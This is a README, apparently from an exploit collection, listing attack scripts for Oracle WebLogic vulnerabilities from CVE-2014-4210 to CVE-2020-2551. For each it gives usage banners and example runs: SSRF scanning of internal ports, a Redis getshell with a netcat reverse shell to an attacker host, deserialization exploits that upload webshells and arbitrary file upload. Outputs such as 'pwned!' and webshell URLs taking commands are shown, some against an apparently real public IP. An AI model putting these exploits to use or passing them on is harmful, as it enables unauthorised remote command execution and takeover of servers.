# About Oracle Weblogic
> WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

# Vulnerability list
[**cve-2014-4210_ssrf_scan.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic SSRF 扫描内网端口利用脚本 [[使用]](https://freeerror.org/d/483)  
[**cve-2014-4210_ssrf_redis_shell.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic SSRF漏洞内网redis未授权getshell脚本[[使用]](https://freeerror.org/d/483)  
[**cve-2017-3506_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic wls-wsat 远程命令执行漏洞检测脚本[[使用]](https://freeerror.org/d/468)  
[**cve-2017-3506_webshell.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic wls-wsat 远程命令执行漏洞利用，上传Webshell[[使用]](https://freeerror.org/d/468)  
[**cve-2017-10271_poc.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic wls-wsat XMLDecoder 反序列化漏洞[[使用]](https://freeerror.org/d/460)  
[**cve-2017-10271_webshell.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic wls-wsat XMLDecoder 反序列化漏洞利用脚本[[使用]](https://freeerror.org/d/460)  
[**cve-2018-2628_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic WLS Core Components 反序列化命令执行漏洞验证脚本[[使用]](https://freeerror.org/d/464)  
[**cve-2018-2628_webshell.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) 	Weblogic WLS Core Components 命令执行漏洞上传Webshell脚本[[使用]](https://freeerror.org/d/464)  
[**cve-2018-2893_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) WebLogic WLS 核心组件反序列化漏洞检测脚本  
[**cve-2018-2893_cmd.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) WebLogic WLS 核心组件反序列化漏洞利用脚本  
[**cve-2018-2894_poc_exp.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/)	Weblogic 任意文件上传漏洞检测+利用  
[**cve-2019-2618_webshell.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic 任意文件上传漏洞(需要账户密码)[[使用]](https://freeerror.org/d/469)  
[**cve-2020-2551_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic IIOP 反序列化漏洞检测脚本

# Readme
部分脚本文件使用说明，详细使用分析请参考[vulnerability-list](https://github.com/zhzyker/exphub/tree/master/weblogic#vulnerability-list)中的[使用]
- VER: 漏洞影响版本，一般情况下不在影响范围的版本没有相关漏洞
- USE: 脚本文件使用说明，大部分写在了脚本里，执行即可见
- EXP: 脚本利用示例，以及执行效果
- DES: 部分特殊脚本文件的特殊描述

## CVE-2014-4210_ssrf_scan.py Weblogic SSRF 漏洞扫描内网端口
> VER:
> ```
> Weblogic 10.0.2
> Weblogic 10.3.6
> ```
> USE:
> ```
> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py 
> +----------------------------------------------------------------------+
> + USE: python <filename> <target_ip:port> <scan_address> <process>     +
> + EXP: python cve-2014-4210_ssrf_scan.py 1.1.1.1:7001 192.168.1.0 20   +
> + VER: 10.0.2,10.3.6                                                   +
> +----------------------------------------------------------------------+
> ```
> EXP:
> ```
> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py  59.110.214.109:7001 192.168.112.0 30
> 192.168.112
> [*]+------------------------+
> [*]+  Scanning ip and port  +
> [*]+------------------------+
> [+] 192.168.112.1:22
> [+] 192.168.112.2:80
> [+] 192.168.112.3:7001
> [+] 192.168.112.1:7001
> [+] 192.168.112.2:6379
> [*]+------------------------+
> [*]+     Scan completed     +
> [*]+------------------------+
> ```  

## CVE-2014-4210_ssrf_scan.py Weblogic SSRF 漏洞扫描内网端口
> VER:
> ```
> Weblogic 10.0.2
> Weblogic 10.3.6
> ```
> USE:
> ```
> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_redis_shell.py 
> +---------------------------------------------------------------------------------------------------+
> + USE: python <filename> <weblogic_ip> <weblogic_port> <inside_ip> <inside_port> <nc_ip> <nc_port>  +
> + EXP: python filename.py 1.1.1.1 7001 192.168.1.1 6379 2.2.2.2 5555                                +
> + VER: 10.0.2,10.3.6                                                                                +
> +---------------------------------------------------------------------------------------------------+
> ```
> DES:
> ```
> <weblogic_ip> weblogic的IP地址
> <weblogic_port> weblogic的端口，一般情况下为7001
> <inside_ip> 内网redis主机的IP地址，该地址通过 6.1 的scan脚本得出
> <inside_port> 内网redis的端口，默认6379
> <nc_ip> 反弹nc shell的IP
> <nc_port> 反弹nc shell的端口
> ```
> EXP:
> ![Image](https://github.com/zhzyker/exphub/blob/master/weblogic/image/cve-2014-4210_ssrf_redis_shell.png)
  
## CVE-2017-3506_poc.py Weblogic wls-wsat远程命令执行漏洞检测脚本
> VER:
> ```
> 10.3.6.0
> 12.1.3.0
> 12.2.1.0
> 12.2.1.1
> 12.2.1.2 
> ```
> USE:
> ```
> zhzy@debian:$ python cve-2017-3506_poc.py
> +--------------------------------------------------------+
> + USE: python cve-2017-3506_poc.py <url:port>            +
> + VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2  +
> + EXP: python cve-2017-3506_poc.py 59.110.214.109:7001   +
> +--------------------------------------------------------+
> ```
> EXP:
> ```
> zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7001
> [+] CVE-2017-3506 Vulnerability
> zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7000
> [-] No Vulnerability
> ```

## cve-2017-3506_webshell.jar Weblogic wls-wsat远程命令执行漏洞利用，上传Webshell
> VER:
> ```
> 10.3.6.0
> 12.1.3.0
> 12.2.1.0
> 12.2.1.1
> 12.2.1.2 
> ```
> USE:
> ```
> zhzy@debian:$ java -jar cve-2017-10271_webshell.jar 
> [*]              Oracle : WebLogic wls-wsat RCE Exp
> [*]              CVE ID : CVE-2017-3506 & CVE-2017-10271
> [*]  Vulnerability info : https://secfree.com/article-635.html
> [*]              Author : Bearcat@secfree.com
> [*]  Vulnerability page ：wls-wsat/CoordinatorPortType & wls-wsat/CoordinatorPortType11 
> [*]               Usage ：java -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx.xxx:7001 test.jsp
> [*] Vulnerability patch : http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
> ```
> EXP:
> ```
> zhzy@debian:$ java -jar cve-2017-10271_webshell.jar http://59.110.214.109:7007 > shell.jsp
> [*] Starting exploit...
> [*] Sending payloads...
> [*] Payloads sent...
> [*] Opening shell...
> [*] pwned! Go ahead...
> 
> [+] http://59.110.214.109:7007/bea_wls_internal/shell.jsp?password=secfree&command=whoami
> ```

## cve-2017-10271_poc.jar Weblogic wls-wsat XMLDecoder反序列化漏洞检测脚本
> VER:
> ```
> Oracle WebLogic Server10.3.6.0.0 版本
> Oracle WebLogic Server12.1.3.0.0 版本
> Oracle WebLogic Server12.2.1.1.0 版本
> Oracle WebLogic Server12.2.1.2.0 版本
> ```
> USE:
> ```
> zhzy@debian:$ java -jar cve-2017-10271_poc.jar 
> 
> [*]         	WebLogic wls-wsat组件反序列化漏洞检测工具
> [*]      CVE编号  CVE-2017-10271
> [*]     漏洞详情  https://www.secfree.com/article-635.html
> [*]     作者邮箱  Bearcat@secfree.com
> [*] 使用方法:
> [*]  单个URL检测  java -jar WebLogic-Wls-wsat-XMLDecoder.jar -u http://www.xxx.com:7001
> [*]     批量检测  java -jar WebLogic-Wls-wsat-XMLDecoder.jar -f UrlfilePath
> ```
> EXP:
> ```
> zhzy@debian:$ java -jar cve-2017-10271_poc.jar -u http://59.110.214.109:7001
> 
> [11:33:37] [+] 漏洞存在 http://59.110.214.109:7001/wls-wsat/test.logs
> ```

## cve-2017-10271_webshell.jar Weblogic wls-wsat XMLDecoder反序列化漏洞利用脚本，上传Webshell
> VER:
> ```
> Oracle WebLogic Server10.3.6.0.0 版本
> Oracle WebLogic Server12.1.3.0.0 版本
> Oracle WebLogic Server12.2.1.1.0 版本
> Oracle WebLogic Server12.2.1.2.0 版本
> ```
> EXP:
> ```
> zhzy@debian:$ java -jar cve-2017-10271_webshell.jar -u http://59.110.214.109:7001
> 
> [*] Starting exploit...
> [*] Sending payloads...
> [*] Payloads sent...
> [*] Opening shell...
> [*] pwned! Go ahead...
> 
> [+] -u/bea_wls_internal/http://59.110.214.109:7001?password=secfree&command=whoami
> ```

## cve-2018-2628_poc.py Weblogic WLS Core Components 反序列化命令执行漏洞验证脚本[[使用]](https://freeerror.org/d/464)
> ```
> zhzy@debian:$ python cve-2018-2628_poc.py 
> +--------------------------------------------------------+
> + USE: python cve-2018-2628_poc.py <ip> <port>           +
> + VER: Oracle WebLogic Server 10.3.6.0                   +
> +      Oracle WebLogic Server 12.2.1.2                   +
> +      Oracle WebLogic Server 12.2.1.3                   +
> +      Oracle WebLogic Server 12.1.3.0                   +
> + EXP: python cve-2018-2628_poc.py 1.1.1.1 7001          +
> +--------------------------------------------------------+
> ```

## cve-2018-2628_webshell.py Weblogic WLS Core Components 命令执行漏洞上传Webshell脚本[[使用]](https://freeerror.org/d/464)
> USE:
> ```
> zhzy@debian:$ python cve-2018-2628_webshell.py 
> +---------------------------------------------------------------+
> + USE: python cve-2018-2628_webshell.py <ip> <port> <webshell>  +
> + VER: Oracle WebLogic Server 10.3.6.0                          +
> +      Oracle WebLogic Server 12.2.1.2                          +
> +      Oracle WebLogic Server 12.2.1.3                          +
> +      Oracle WebLogic Server 12.1.3.0                          +
> + EXP: python cve-2018-2628_webshell.py 1.1.1.1 7001 shell1.jsp +
> +---------------------------------------------------------------+
> ```
> EXP:
> ```
> zhzy@debian:$ python cve-2018-2628_webshell.py 1.1.1.11 7001 shell1.jsp
> [*] handshake successful
> [*] usage: python cve-2018-2628.py ip port shell1.jsp
> [+] Shell Dir: servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\shell1.jsp
> 
> [+] Webshell: http://1.1.1.1:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg==
> ```

## cve-2018-2893_poc.py WebLogic WLS 核心组件反序列化漏洞检测脚本
> VER:
> ```
> Oracle WebLogic Server 10.3.6.0
> Oracle WebLogic Server 12.1.3.0
> Oracle WebLogic Server 12.2.1.2
> Oracle WebLogic Server 12.2.1.3
> ```
> USE:
> ```
> zhzy@debian:$ python cve-2018-2893_poc.py 
> +--------------------------------------------------------+
> + USE: python cve-2017-3506_poc.py <url:port>            +
> + VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2  +
> + EXP: python cve-2017-3506_poc.py 59.110.214.109:7001   +
> +--------------------------------------------------------+
> ```
> EXP:
> ```
> zhzy@debian:$ python cve-2018-2893_poc.py 59.110.214.109 7001
> [+] testing target
> [+] send request payload successful,recv length:1700
> [+] 59.110.214.109:7001 is vul CVE-2018-2893
> ```

## cve-2018-2893_cmd.py WebLogic WLS 核心组件反序列化漏洞利用脚本
> ```
> zhzy@debian:$ python cve-2018-2893_cmd.py
> +------------------------------------------------------------------------------+
> + VER: Oracle WebLogic Server 10.3.6.0                                         +
> +      Oracle WebLogic Server 12.1.3.0                                         +
> +      Oracle WebLogic Server 12.2.1.2                                         +
> +      Oracle WebLogic Server 12.2.1.3                                         +
> + USE: python cve-2018-2893_cmd.py <host> <port> <reverse_host> <reverse_port> +
> + EXP: python cve-2018-2893_cmd.py 1.1.1.1 7001 2.2.2.2 3333                   +
> +      [2.2.2.2] nc -lvvp 3333                                                 +
> +------------------------------------------------------------------------------+
> ```

## cve-2018-2894_poc_exp.py	Weblogic 任意文件上传漏洞检测+利用
> VER:
> ```
> 10.3.6.0
> 12.1.3.0
> 12.2.1.2
> 12.2.1.3
> ```
> EXP:
> ```
> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2018-2894_upload.py -t http://1.1.1.1:7001
> [*] First Deploying Website Please wait a moment ...
> [+] http://1.1.1.1:7001 exists CVE-2018-2894
> [+] Check URL: http://1.1.1.1:7001/ws_utc/css/config/keystore/1585895893159_360sglab.jsp 
> ```

## cve-2019-2618_webshell.py Weblogic 任意文件上传漏洞 (需要账户密码)
> USE:
> ```
> zhzy@debian:$ python cve-2019-2618_webshell.py 
> +-----------------------------------------------------------------------+
> + VER: Oracle WebLogic Server 10.3.6.0                                  +
> +      Oracle WebLogic Server 12.1.3.0                                  +
> +      Oracle WebLogic Server 12.2.1.3                                  +
> + USE: python cve-2019-2618_webshell.py <username> <password>           +
> + EXP: python cve-2019-2618.py http://1.1.1.1:7001 weblogic Oracle@123  +
> +-----------------------------------------------------------------------+
> ```
> EXP:
> ```
> zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2019-2618_webshell.py http://1.1.1.1:7007/ weblogic Oracle@123
> 
> ========================================================================
>    _______      ________    ___   ___  __  ___       ___   __ __  ___  
>   / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \     |__ \ / //_ |/ _ \ 
>  | |     \ \  / /| |__ ______ ) | | | || | (_) |______ ) / /_ | | (_) |
>  | |      \ \/ / |  __|______/ /| | | || |\__, |______/ / '_ \| |> _ < 
>  | |____   \  /  | |____    / /_| |_| || |  / /      / /| (_) | | (_) |
>   \_____|   \/   |______|  |____|\___/ |_| /_/      |____\___/|_|\___/ 
>                                                                        
>       Weblogic Upload Vuln(Need  username password)-CVE-2019-2618
>                               By Jas502n     
> ========================================================================
> >>>>Upload Shell Addresss: 
> http://1.1.1.1:7007/bea_wls_internal/shell.jsp
> ```

## cve-2020-2551_poc.py Weblogic IIOP 反序列化漏洞检测脚本
> USE:
> ```
> zhzy@debian:$ python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001
> +---------------------------------------------------   -----+
> + USE: python cve-2020-2551_poc.py <url:port>               +
> + VER: 10.3.6.0.0                                           +
> +      12.1.3.0.0                                           +
> +      12.2.1.3.0                                           +
> +      12.2.1.4.0                                           +
> + EXP: python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001  +
> +-----------------------------------------------------------+
> [+] found CVE-2020-2551  1.1.1.1:7007
> ```

